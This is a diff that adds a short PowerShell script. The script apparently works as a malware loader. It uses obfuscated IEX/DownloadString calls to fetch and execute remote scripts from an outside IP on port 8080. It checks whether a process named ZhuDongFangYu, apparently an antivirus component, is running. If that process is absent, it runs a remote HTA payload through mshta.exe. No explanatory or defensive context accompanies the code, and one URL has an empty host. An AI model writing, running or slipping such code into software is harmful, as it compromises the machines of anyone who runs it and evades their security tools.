@@ -1,0 +1,16 @@
+IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tp://:8080/Update.back')
+			
+$id = Get-Process -name ZhuDongFangYu* | Select-Object id | ForEach-Object -Process{$_.id}
+			
+if($id -eq $null) {
+			
+C:\Windows\SysWOW64\mshta.exe http://10.0.0.1:123@:8080/foo443.hta
+
+}
+			
+else{
+			
+IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tp://47.52.61.250:8080/test.ps1')
+	
+}
+
